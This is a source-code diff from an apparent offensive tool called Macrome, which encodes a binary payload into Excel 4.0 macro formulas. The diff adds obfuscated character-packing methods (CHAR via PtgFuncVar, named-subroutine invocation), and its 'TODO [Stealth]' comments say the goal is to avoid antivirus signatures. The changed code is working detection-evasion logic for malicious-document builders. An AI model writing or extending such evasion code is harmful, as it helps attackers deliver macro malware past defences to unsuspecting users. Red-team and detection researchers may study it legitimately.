@@ -16,6 +16,8 @@ namespace Macrome
     {
         public const string TOOLONGMARKER = "<FORMULAISTOOLONG>";
 
+
+
         /// <summary>
         /// Convert a binary payload into a series of cells representing the binary data.
         /// Can be iterated across as described in https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
@@ -58,6 +60,35 @@ namespace Macrome
             ptgStack.Push(new PtgFuncVar(FtabValues.GOTO, 1, AbstractPtg.PtgDataType.VALUE));
             return ptgStack;
         }
+
+        private static Stack<AbstractPtg> GetCharSubroutineForInt(ushort charInt, string varName,
+            int functionLabelOffset)
+        {
+            List<AbstractPtg> ptgList = new List<AbstractPtg>();
+            ptgList.Add(new PtgFuncVar(FtabValues.IF, 3, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgMissArg());
+            ptgList.Add(new PtgFuncVar(FtabValues.USERDEFINEDFUNCTION, 1, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgName(functionLabelOffset));
+            ptgList.Add(new PtgFuncVar(FtabValues.SET_NAME, 2, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgInt(charInt));
+            ptgList.Add(new PtgStr(varName));
+            ptgList.Reverse();
+            return new Stack<AbstractPtg>(ptgList);
+        }
+
+        public static Formula CreateCharInvocationFormulaForLblIndex(ushort rw, ushort col, int lblIndex)
+        {
+            List<AbstractPtg> ptgList = new List<AbstractPtg>();
+            ptgList.Add(new PtgFuncVar(FtabValues.RETURN, 1, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgName(lblIndex));
+            ptgList.Reverse();
+            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>(ptgList);
+
+            Formula charInvocationFormula = new Formula(new Cell(rw, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
+            return charInvocationFormula;
+        }
+
 
         public static Stack<AbstractPtg> GetAlertPtgStack(string alertString)
         {
@@ -108,8 +139,10 @@ namespace Macrome
             ptgStack.Push(new PtgFunc(FtabValues.ROUND, AbstractPtg.PtgDataType.VALUE));
 
             //An alternate way to invoke the CHAR function by using PtgFuncVar instead
-            //ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
-            ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
+            //TODO [Stealth] this is sig-able and we'll want to do something more generalized than abuse the fact AV doesn't pay attention
+            //        Idea: Replace CHAR invocation with a named function that invokes 
+            ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
+            // ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
 
             //Merge the random PtgRef we generate at the beginning
             ptgStack.Push(new PtgConcat());
@@ -117,7 +150,7 @@ namespace Macrome
         }
 
         public static List<BiffRecord> ConvertStringsToRecords(List<string> strings, int rwStart, int colStart, int dstRwStart, int dstColStart,
-            int ixfe = 15)
+            int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
         {
             List<BiffRecord> formulaList = new List<BiffRecord>();
 
@@ -154,7 +187,7 @@ namespace Macrome
                        //but the logic is being kept in case there are edge cases or there ends up being a workaround
                        //for the limitation
                        List<string> chunks = rowString.SplitStringIntoChunks(250);
-                       formulas = ConvertChunkedStringToFormulas(chunks, curRow, curCol, dstCurRow, dstCurCol, ixfe);
+                       formulas = ConvertChunkedStringToFormulas(chunks, curRow, curCol, dstCurRow, dstCurCol, ixfe, packingMethod);
                    }
                    else
                    {
@@ -165,11 +198,11 @@ namespace Macrome
                        if (curString.StartsWith(FormulaHelper.TOOLONGMARKER))
                        {
                            formulas = ConvertMaxLengthStringToFormulas(curString, curRow, curCol, dstCurRow,
-                               dstCurCol + colOffset, ixfe);
+                               dstCurCol + colOffset, ixfe, packingMethod);
                        }
                        else
                        {
-                           formulas = ConvertStringToFormulas(rowStrings[colOffset], curRow, curCol, dstCurRow, dstCurCol + colOffset, ixfe);
+                           formulas = ConvertStringToFormulas(rowStrings[colOffset], curRow, curCol, dstCurRow, dstCurCol + colOffset, ixfe, packingMethod);
                        }
                    }
 
@@ -198,7 +231,7 @@ namespace Macrome
             return formulaList;
         }
 
-        public static List<BiffRecord> ConvertMaxLengthStringToFormulas(string curString, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15)
+        public static List<BiffRecord> ConvertMaxLengthStringToFormulas(string curString, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
         {
             string actualString =
                 new string(curString.Skip(FormulaHelper.TOOLONGMARKER.Length).ToArray());
@@ -214,7 +247,7 @@ namespace Macrome
             Random r = new Random();
             int rndCol = r.Next(0x90, 0x9F);
             int rndRw = r.Next(0xF000, 0xF800);
-            formulas.AddRange(ConvertStringToFormulas(remainingString, curRow, curCol, rndRw, rndCol));
+            formulas.AddRange(ConvertStringToFormulas(remainingString, curRow, curCol, rndRw, rndCol, ixfe, packingMethod));
 
             curRow += formulas.Count;
 
@@ -233,14 +266,14 @@ namespace Macrome
             macroString += string.Format("R{0}C{1}",rndRw + 1, rndCol + 1);
             createdCells.Add(remainderCell);
 
-            List<BiffRecord> mainFormula = ConvertStringToFormulas(macroString, curRow, curCol, dstRw, dstCol);
+            List<BiffRecord> mainFormula = ConvertStringToFormulas(macroString, curRow, curCol, dstRw, dstCol, ixfe, packingMethod);
             formulas.AddRange(mainFormula);
 
             return formulas;
         }
 
         public static List<BiffRecord> ConvertChunkedStringToFormulas(List<string> chunkedString, int rwStart, int colStart, int dstRw,
-            int dstCol, int ixfe = 15)
+            int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
         {
             List<BiffRecord> formulaList = new List<BiffRecord>();
             
@@ -256,7 +289,7 @@ namespace Macrome
                 //TODO [Stealth] Perform additional operations to obfuscate static =CHAR(#) signature
                 foreach (char c in str)
                 {
-                    Stack<AbstractPtg> ptgStack = GetObfuscatedCharPtgForInt(Convert.ToUInt16(c));
+                    Stack<AbstractPtg> ptgStack = GetPtgStackForChar(c, packingMethod);
 
                     ushort charValue = Convert.ToUInt16(c);
                     if (charValue > 0xFF)
@@ -302,7 +335,23 @@ namespace Macrome
             return formulaList;
         }
 
-        private static List<BiffRecord> ConvertStringToFormulas(string str, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15)
+        public static Stack<AbstractPtg> GetPtgStackForChar(char c, SheetPackingMethod packingMethod)
+        {
+            switch (packingMethod)
+            {
+                case SheetPackingMethod.ObfuscatedCharFunc:
+                    return  GetObfuscatedCharPtgForInt(Convert.ToUInt16(c));
+                case SheetPackingMethod.ObfuscatedCharFuncAlt:
+                    return GetCharPtgForInt(Convert.ToUInt16(c));
+                case SheetPackingMethod.CharSubroutine:
+                    //For now assume that the var name "var" is used, and the appropriate label is at offset 1 (first lbl record)
+                    return GetCharSubroutineForInt(Convert.ToUInt16(c), "var", 1);
+                default:
+                    throw new NotImplementedException();
+            }
+        }
+
+        private static List<BiffRecord> ConvertStringToFormulas(string str, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
         {
             List<BiffRecord> formulaList = new List<BiffRecord>();
             List<Cell> createdCells = new List<Cell>();
@@ -313,7 +362,7 @@ namespace Macrome
             //TODO [Stealth] Perform additional operations to obfuscate static =CHAR(#) signature
             foreach (char c in str)
             {
-                Stack<AbstractPtg> ptgStack = GetObfuscatedCharPtgForInt(Convert.ToUInt16(c));
+                Stack<AbstractPtg> ptgStack = GetPtgStackForChar(c, packingMethod);
 
                 ushort charValue = Convert.ToUInt16(c);
                 if (charValue > 0xFF)
